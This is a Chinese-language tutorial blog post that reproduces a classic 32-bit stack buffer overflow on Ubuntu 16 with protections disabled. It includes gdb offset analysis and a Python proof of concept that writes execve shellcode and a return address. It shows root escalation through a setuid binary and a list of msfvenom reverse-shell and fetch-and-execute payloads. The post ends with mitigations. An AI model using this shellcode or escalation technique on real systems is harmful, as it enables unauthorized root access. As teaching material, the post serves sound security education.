---
title: 缓冲区溢出攻击
name: buffer-overflow
date: 2023-09-02 06:09:28
id: 0
tags: [安全测试, linux]
categories: [安全测试]
abstract: ""
---

缓冲区溢出攻击在`c`语言中的复现与原理分析

<!--more-->

## 危害

缓冲区溢出本身会导致程序运行异常，但是如果程序的输入外部可控就能利用溢出的缓冲区执行恶意程序来攻击系统

## 原理分析

程序调用时的栈信息

![img](/images/buffer-overflow-1.jpg)

我们在`main`函数中调用了`foo`函数， 那么程序的调用关系会记录在栈中

CPU仅存在一个帧指针寄存器，会指向当前函数的栈帧

当前的栈中的调用关系为`main->foo->bar`

那么在进入bar函数的调用前，帧指针就会指向foo函数的栈帧，在foo函数执行后，帧指针就会指向bar的栈帧

> 在32位系统如此，32位系统中的帧指针为`ebp`
>
> 在64为中存在多个寄存器，帧指针为`rbp`

### 一个简单的缓冲区溢出

```c
#include <string.h>
void foo(char *str)
{
char buffer[12];
/* The following statement will cause buffer overflow */
strcpy(buffer, str);
}
int main()
{
char *str = "This is definitely longer than 12";
foo(str);
return 1;
}
```

因为限制了缓冲区的大小为12， 在接受的str长度超过12后就会导致strcpy函数将数据覆盖到buffer区域以外的内存中，这就是缓冲区溢出

![img](/images/buffer-overflow-2.jpg)

溢出缓冲区的数据会覆盖原来栈内存中的数据，其中就包含当前函数的返回地址

如果数据覆盖了这个地址，并且指向了一个新的地址，那么程序就会跳转了新的地址上，如果我们在新的地址上包含恶意的指令，那么这些指令就会被执行

![img](/images/buffer-overflow-3.jpg)

我们可以通过精心的构造，在输入数据中包含一个新的返回地址和恶意程序

当发生缓冲区溢出时，覆盖到内存的数据将新的返回地址覆盖到原先的返回地址上

新的返回地址指向我们的恶意程序，就会对系统造成攻击

## 问题复现

条件：

- ubuntu16 i386 32位操作系统
- 关闭安全编译选项，关闭地址随机化

### C源码

```c
/* This program has a buffer overflow vulnerability. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int foo(char *str)
{
    char buffer[100];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[400];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("Returned Properly\n");
    return 1;
}
```

程序会从`badfile`文件中读取内容，因为buffer的大小只有100小于badfile的文件内容长度

在进行`strcpy`的时候就会出现缓冲区溢出的问题

### gdb调试过程

```bash
root@ubuntu:/home/landers/test# gcc -o stack -z execstack -fno-stack-protector -g  stack.c 
root@ubuntu:/home/landers/test# gdb ./stack
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./stack...done.
(gdb) b foo
Breakpoint 1 at 0x80484c1: file stack.c, line 11.
(gdb) run
Starting program: /home/landers/test/stack 

Breakpoint 1, foo (str=0xbffff4ec '\220' <repeats 112 times>, "P\353\377\277", '\220' <repeats 84 times>...) at stack.c:11
11          strcpy(buffer, str);
(gdb) p $ebp
$1 = (void *) 0xbffff4c8
(gdb) p &buffer
$2 = (char (*)[100]) 0xbffff45c
(gdb) p/d 0xbffff4c8 - 0xbffff45c
$3 = 108
(gdb) quit
```

通过断点定位`foo`函数的执行，foo函数的`$ebp`帧地址为`0xbffff4c8`

`buffer`的地址为`0xbffff45c`， 通过计算差值可以得到从buffer地址到当前帧地址`0xbffff4c8`的距离为`108`

那么发生缓冲区溢出后的函数下一条地址应该为`108+4=112`

> 在32位系统上的寄存器地址位移为4

所以我们的POC中，shellcode的执行地址应该是`112-116`

### POC代码

```python
#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0"             # xorl    %eax,%eax
    "\x50"                 # pushl   %eax
    "\x68""//sh"           # pushl   $0x68732f2f
    "\x68""/bin"           # pushl   $0x6e69622f
    "\x89\xe3"             # movl    %esp,%ebx
    "\x50"                 # pushl   %eax
    "\x53"                 # pushl   %ebx
    "\x89\xe1"             # movl    %esp,%ecx
    "\x99"                 # cdq
    "\xb0\x0b"             # movb    $0x0b,%al
    "\xcd\x80"             # int     $0x80
).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(300))

# Put the shellcode at the end
start = 300 - len(shellcode)
content[start:] = shellcode

# Put the address at offset 112
ret = 0xbffff4c8 + 100
content[112:116]  = (ret).to_bytes(4,byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```

构造POC文件，在缓冲区溢出后，将`shellcode`执行的地址`ret`插入到程序的下一条地址

发生缓冲区溢出后，缓冲区中的内容就会覆盖程序原本的**下一次调用地址**

这样在foo函数发生溢出后，调用下一次函数调用时就会执行到shellcode上

### 漏洞利用

创建一个test用户，给予`stack`程序suid权限， 让它被执行时以root运行

```bash
root@ubuntu:/home/landers/test# ll ./stack
-rwsr-xr-x 1 root root 9772 Sep  1 23:08 ./stack*
root@ubuntu:/home/landers/test# su test
test@ubuntu:/home/landers/test$ id
uid=1001(test) gid=1001(test) groups=1001(test)

test@ubuntu:/home/landers/test$ ./stack 
# id                                                                                                                      
uid=1001(test) gid=1001(test) euid=0(root) groups=1001(test)
# whoami                                                                                                                  
root
```

> 在ubuntu16下的sh默认自带安全保护机制，当前程序存在suid并且默认以suid位运行时
>
> 会自动舍弃suid位，回到原本执行的用户
>
> 所以这里使用zsh来替代sh
>
> ```bash
> ln -sf /bin/zsh /bin/sh
> ```

至此我们通过缓冲区溢出的漏洞，成功提权到root权限

## 使用msfvenom来生成shellcode

**shellcode**实际为一段可以被CPU执行的汇编代码， 我们除了手写可以使用工具来生成

```bash
➜  ~ msfvenom -l payloads|grep linux|grep x86
    cmd/linux/http/x86/adduser                                         Fetch and execute a x86 payload from an HTTP server. Create a new user with UID 0
    cmd/linux/http/x86/chmod                                           Fetch and execute a x86 payload from an HTTP server. Runs chmod on specified file with specified mode
    cmd/linux/http/x86/exec                                            Fetch and execute a x86 payload from an HTTP server. Execute an arbitrary command or just a /bin/sh shell
    cmd/linux/http/x86/generic/debug_trap                              Fetch and execute a x86 payload from an HTTP server. Generate a debug trap in the target process
    cmd/linux/http/x86/generic/tight_loop                              Fetch and execute a x86 payload from an HTTP server. Generate a tight loop in the target process
    cmd/linux/http/x86/meterpreter/bind_ipv6_tcp                       Fetch and execute a x86 payload from an HTTP server. Listen for an IPv6 connection (Linux x86)
    cmd/linux/http/x86/meterpreter/bind_ipv6_tcp_uuid                  Fetch and execute a x86 payload from an HTTP server. Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/http/x86/meterpreter/bind_nonx_tcp                       Fetch and execute a x86 payload from an HTTP server. Listen for a connection
    cmd/linux/http/x86/meterpreter/bind_tcp                            Fetch and execute a x86 payload from an HTTP server. Listen for a connection (Linux x86)
    cmd/linux/http/x86/meterpreter/bind_tcp_uuid                       Fetch and execute a x86 payload from an HTTP server. Listen for a connection with UUID Support (Linux x86)
    cmd/linux/http/x86/meterpreter/find_tag                            Fetch and execute a x86 payload from an HTTP server. Use an established connection
    cmd/linux/http/x86/meterpreter/reverse_ipv6_tcp                    Fetch and execute a x86 payload from an HTTP server. Connect back to attacker over IPv6
    cmd/linux/http/x86/meterpreter/reverse_nonx_tcp                    Fetch and execute a x86 payload from an HTTP server. Connect back to the attacker
    cmd/linux/http/x86/meterpreter/reverse_tcp                         Fetch and execute a x86 payload from an HTTP server. Connect back to the attacker
    cmd/linux/http/x86/meterpreter/reverse_tcp_uuid                    Fetch and execute a x86 payload from an HTTP server. Connect back to the attacker
    cmd/linux/http/x86/meterpreter_reverse_http                        Fetch and execute a x86 payload from an HTTP server.    cmd/linux/http/x86/meterpreter_reverse_https                       Fetch and execute a x86 payload from an HTTP server.    cmd/linux/http/x86/meterpreter_reverse_tcp                         Fetch and execute a x86 payload from an HTTP server.    cmd/linux/http/x86/metsvc_bind_tcp                                 Fetch and execute a x86 payload from an HTTP server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/http/x86/metsvc_reverse_tcp                              Fetch and execute a x86 payload from an HTTP server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/http/x86/read_file                                       Fetch and execute a x86 payload from an HTTP server. Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    cmd/linux/http/x86/shell/bind_ipv6_tcp                             Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    cmd/linux/http/x86/shell/bind_ipv6_tcp_uuid                        Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/http/x86/shell/bind_nonx_tcp                             Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Listen for a connection
    cmd/linux/http/x86/shell/bind_tcp                                  Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Listen for a connection (Linux x86)
    cmd/linux/http/x86/shell/bind_tcp_uuid                             Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    cmd/linux/http/x86/shell/find_tag                                  Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Use an established connection
    cmd/linux/http/x86/shell/reverse_ipv6_tcp                          Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Connect back to attacker over IPv6
    cmd/linux/http/x86/shell/reverse_nonx_tcp                          Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/http/x86/shell/reverse_tcp                               Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/http/x86/shell/reverse_tcp_uuid                          Fetch and execute a x86 payload from an HTTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/http/x86/shell_bind_ipv6_tcp                             Fetch and execute a x86 payload from an HTTP server. Listen for a connection over IPv6 and spawn a command shell
    cmd/linux/http/x86/shell_bind_tcp                                  Fetch and execute a x86 payload from an HTTP server. Listen for a connection and spawn a command shell
    cmd/linux/http/x86/shell_bind_tcp_random_port                      Fetch and execute a x86 payload from an HTTP server. Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    cmd/linux/http/x86/shell_find_port                                 Fetch and execute a x86 payload from an HTTP server. Spawn a shell on an established connection
    cmd/linux/http/x86/shell_find_tag                                  Fetch and execute a x86 payload from an HTTP server. Spawn a shell on an established connection (proxy/nat safe)
    cmd/linux/http/x86/shell_reverse_tcp                               Fetch and execute a x86 payload from an HTTP server. Connect back to attacker and spawn a command shell
    cmd/linux/http/x86/shell_reverse_tcp_ipv6                          Fetch and execute a x86 payload from an HTTP server. Connect back to attacker and spawn a command shell over IPv6
    cmd/linux/https/x86/adduser                                        Fetch and execute an x86 payload from an HTTPS server. Create a new user with UID 0
    cmd/linux/https/x86/chmod                                          Fetch and execute an x86 payload from an HTTPS server. Runs chmod on specified file with specified mode
    cmd/linux/https/x86/exec                                           Fetch and execute an x86 payload from an HTTPS server. Execute an arbitrary command or just a /bin/sh shell
    cmd/linux/https/x86/generic/debug_trap                             Fetch and execute an x86 payload from an HTTPS server. Generate a debug trap in the target process
    cmd/linux/https/x86/generic/tight_loop                             Fetch and execute an x86 payload from an HTTPS server. Generate a tight loop in the target process
    cmd/linux/https/x86/meterpreter/bind_ipv6_tcp                      Fetch and execute an x86 payload from an HTTPS server. Listen for an IPv6 connection (Linux x86)
    cmd/linux/https/x86/meterpreter/bind_ipv6_tcp_uuid                 Fetch and execute an x86 payload from an HTTPS server. Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/https/x86/meterpreter/bind_nonx_tcp                      Fetch and execute an x86 payload from an HTTPS server. Listen for a connection
    cmd/linux/https/x86/meterpreter/bind_tcp                           Fetch and execute an x86 payload from an HTTPS server. Listen for a connection (Linux x86)
    cmd/linux/https/x86/meterpreter/bind_tcp_uuid                      Fetch and execute an x86 payload from an HTTPS server. Listen for a connection with UUID Support (Linux x86)
    cmd/linux/https/x86/meterpreter/find_tag                           Fetch and execute an x86 payload from an HTTPS server. Use an established connection
    cmd/linux/https/x86/meterpreter/reverse_ipv6_tcp                   Fetch and execute an x86 payload from an HTTPS server. Connect back to attacker over IPv6
    cmd/linux/https/x86/meterpreter/reverse_nonx_tcp                   Fetch and execute an x86 payload from an HTTPS server. Connect back to the attacker
    cmd/linux/https/x86/meterpreter/reverse_tcp                        Fetch and execute an x86 payload from an HTTPS server. Connect back to the attacker
    cmd/linux/https/x86/meterpreter/reverse_tcp_uuid                   Fetch and execute an x86 payload from an HTTPS server. Connect back to the attacker
    cmd/linux/https/x86/meterpreter_reverse_http                       Fetch and execute an x86 payload from an HTTPS server.
    cmd/linux/https/x86/meterpreter_reverse_https                      Fetch and execute an x86 payload from an HTTPS server.
    cmd/linux/https/x86/meterpreter_reverse_tcp                        Fetch and execute an x86 payload from an HTTPS server.
    cmd/linux/https/x86/metsvc_bind_tcp                                Fetch and execute an x86 payload from an HTTPS server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/https/x86/metsvc_reverse_tcp                             Fetch and execute an x86 payload from an HTTPS server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/https/x86/read_file                                      Fetch and execute an x86 payload from an HTTPS server. Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    cmd/linux/https/x86/shell/bind_ipv6_tcp                            Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    cmd/linux/https/x86/shell/bind_ipv6_tcp_uuid                       Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/https/x86/shell/bind_nonx_tcp                            Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Listen for a connection
    cmd/linux/https/x86/shell/bind_tcp                                 Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Listen for a connection (Linux x86)
    cmd/linux/https/x86/shell/bind_tcp_uuid                            Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    cmd/linux/https/x86/shell/find_tag                                 Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Use an established connection
    cmd/linux/https/x86/shell/reverse_ipv6_tcp                         Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Connect back to attacker over IPv6
    cmd/linux/https/x86/shell/reverse_nonx_tcp                         Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/https/x86/shell/reverse_tcp                              Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/https/x86/shell/reverse_tcp_uuid                         Fetch and execute an x86 payload from an HTTPS server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/https/x86/shell_bind_ipv6_tcp                            Fetch and execute an x86 payload from an HTTPS server. Listen for a connection over IPv6 and spawn a command shell
    cmd/linux/https/x86/shell_bind_tcp                                 Fetch and execute an x86 payload from an HTTPS server. Listen for a connection and spawn a command shell
    cmd/linux/https/x86/shell_bind_tcp_random_port                     Fetch and execute an x86 payload from an HTTPS server. Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    cmd/linux/https/x86/shell_find_port                                Fetch and execute an x86 payload from an HTTPS server. Spawn a shell on an established connection
    cmd/linux/https/x86/shell_find_tag                                 Fetch and execute an x86 payload from an HTTPS server. Spawn a shell on an established connection (proxy/nat safe)
    cmd/linux/https/x86/shell_reverse_tcp                              Fetch and execute an x86 payload from an HTTPS server. Connect back to attacker and spawn a command shell
    cmd/linux/https/x86/shell_reverse_tcp_ipv6                         Fetch and execute an x86 payload from an HTTPS server. Connect back to attacker and spawn a command shell over IPv6
    cmd/linux/tftp/x86/adduser                                         Fetch and execute a x86 payload from a TFTP server. Create a new user with UID 0
    cmd/linux/tftp/x86/chmod                                           Fetch and execute a x86 payload from a TFTP server. Runs chmod on specified file with specified mode
    cmd/linux/tftp/x86/exec                                            Fetch and execute a x86 payload from a TFTP server. Execute an arbitrary command or just a /bin/sh shell
    cmd/linux/tftp/x86/generic/debug_trap                              Fetch and execute a x86 payload from a TFTP server. Generate a debug trap in the target process
    cmd/linux/tftp/x86/generic/tight_loop                              Fetch and execute a x86 payload from a TFTP server. Generate a tight loop in the target process
    cmd/linux/tftp/x86/meterpreter/bind_ipv6_tcp                       Fetch and execute a x86 payload from a TFTP server. Listen for an IPv6 connection (Linux x86)
    cmd/linux/tftp/x86/meterpreter/bind_ipv6_tcp_uuid                  Fetch and execute a x86 payload from a TFTP server. Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/tftp/x86/meterpreter/bind_nonx_tcp                       Fetch and execute a x86 payload from a TFTP server. Listen for a connection
    cmd/linux/tftp/x86/meterpreter/bind_tcp                            Fetch and execute a x86 payload from a TFTP server. Listen for a connection (Linux x86)
    cmd/linux/tftp/x86/meterpreter/bind_tcp_uuid                       Fetch and execute a x86 payload from a TFTP server. Listen for a connection with UUID Support (Linux x86)
    cmd/linux/tftp/x86/meterpreter/find_tag                            Fetch and execute a x86 payload from a TFTP server. Use an established connection
    cmd/linux/tftp/x86/meterpreter/reverse_ipv6_tcp                    Fetch and execute a x86 payload from a TFTP server. Connect back to attacker over IPv6
    cmd/linux/tftp/x86/meterpreter/reverse_nonx_tcp                    Fetch and execute a x86 payload from a TFTP server. Connect back to the attacker
    cmd/linux/tftp/x86/meterpreter/reverse_tcp                         Fetch and execute a x86 payload from a TFTP server. Connect back to the attacker
    cmd/linux/tftp/x86/meterpreter/reverse_tcp_uuid                    Fetch and execute a x86 payload from a TFTP server. Connect back to the attacker
    cmd/linux/tftp/x86/meterpreter_reverse_http                        Fetch and execute a x86 payload from a TFTP server.
    cmd/linux/tftp/x86/meterpreter_reverse_https                       Fetch and execute a x86 payload from a TFTP server.
    cmd/linux/tftp/x86/meterpreter_reverse_tcp                         Fetch and execute a x86 payload from a TFTP server.
    cmd/linux/tftp/x86/metsvc_bind_tcp                                 Fetch and execute a x86 payload from a TFTP server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/tftp/x86/metsvc_reverse_tcp                              Fetch and execute a x86 payload from a TFTP server. Stub payload for interacting with a Meterpreter Service
    cmd/linux/tftp/x86/read_file                                       Fetch and execute a x86 payload from a TFTP server. Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    cmd/linux/tftp/x86/shell/bind_ipv6_tcp                             Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    cmd/linux/tftp/x86/shell/bind_ipv6_tcp_uuid                        Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    cmd/linux/tftp/x86/shell/bind_nonx_tcp                             Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Listen for a connection
    cmd/linux/tftp/x86/shell/bind_tcp                                  Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Listen for a connection (Linux x86)
    cmd/linux/tftp/x86/shell/bind_tcp_uuid                             Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    cmd/linux/tftp/x86/shell/find_tag                                  Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Use an established connection
    cmd/linux/tftp/x86/shell/reverse_ipv6_tcp                          Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Connect back to attacker over IPv6
    cmd/linux/tftp/x86/shell/reverse_nonx_tcp                          Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/tftp/x86/shell/reverse_tcp                               Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/tftp/x86/shell/reverse_tcp_uuid                          Fetch and execute a x86 payload from a TFTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/tftp/x86/shell_bind_ipv6_tcp                             Fetch and execute a x86 payload from a TFTP server. Listen for a connection over IPv6 and spawn a command shell
    cmd/linux/tftp/x86/shell_bind_tcp                                  Fetch and execute a x86 payload from a TFTP server. Listen for a connection and spawn a command shell
    cmd/linux/tftp/x86/shell_bind_tcp_random_port                      Fetch and execute a x86 payload from a TFTP server. Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    cmd/linux/tftp/x86/shell_find_port                                 Fetch and execute a x86 payload from a TFTP server. Spawn a shell on an established connection
    cmd/linux/tftp/x86/shell_find_tag                                  Fetch and execute a x86 payload from a TFTP server. Spawn a shell on an established connection (proxy/nat safe)
    cmd/linux/tftp/x86/shell_reverse_tcp                               Fetch and execute a x86 payload from a TFTP server. Connect back to attacker and spawn a command shell
    cmd/linux/tftp/x86/shell_reverse_tcp_ipv6                          Fetch and execute a x86 payload from a TFTP server. Connect back to attacker and spawn a command shell over IPv6
    linux/x86/adduser                                                  Create a new user with UID 0
    linux/x86/chmod                                                    Runs chmod on specified file with specified mode
    linux/x86/exec                                                     Execute an arbitrary command or just a /bin/sh shell    linux/x86/meterpreter/bind_ipv6_tcp                                Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid                           Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                                Inject the mettle server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                                     Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                                Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                                     Inject the mettle server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp                             Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp                             Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                                  Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid                             Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http                                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_https                                Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_tcp                                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/metsvc_bind_tcp                                          Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                                       Stub payload for interacting with a Meterpreter Service
    linux/x86/read_file                                                Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                                      Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                                 Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                                      Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                                           Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                                      Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                                           Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                                   Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                                   Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                                        Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                                   Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                                      Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                                           Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                               Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                                          Spawn a shell on an established connection
    linux/x86/shell_find_tag                                           Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                                        Connect back to attacker and spawn a command shell
    linux/x86/shell_reverse_tcp_ipv6                                   Connect back to attacker and spawn a command shell over IPv6
```

根据我们使用的平台，语言可以输出对应格式的`payload`

```bash
➜  ~ msfvenom -p linux/x86/exec -f c         
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 20 bytes
Final size of c file: 110 bytes
unsigned char buf[] = 
"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
"\x69\x6e\x89\xe3\xcd\x80";
```

生成c程序格式的Linux32位系统的`exec`执行的payload

## 安全编译选项

通过一些操作系统机制和安全编译选项可以禁止掉此类问题

问题的核心在于缓冲区中的恶意程序可以被执行

`NX`即No-eXecute（不可执行）NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。

`PIE（ASLR）`地址随机化， 开启内存地址随机化后会使每次帧栈的地址变化，导致猜测的难度提升

在演示中的程序就是关闭了这些特性

```bash
gcc -o stack -z execstack -fno-stack-protector -g  stack.c 
```

参数设置

```bash
NX：-z execstack / -z noexecstack (关闭 / 开启)
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)
PIE：-no-pie / -pie (关闭 / 开启)
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)
```

## 参考资料

[buffer overflow](https://www.handsonsecurity.net/files/chapters/buffer_overflow_c.pdf)

[gcc安全编译选项](https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/)

[msfvenom framework](https://apt.metasploit.com/)

[wget的缓冲区溢出攻击 CVE-2017-13089](https://paper.seebug.org/453/)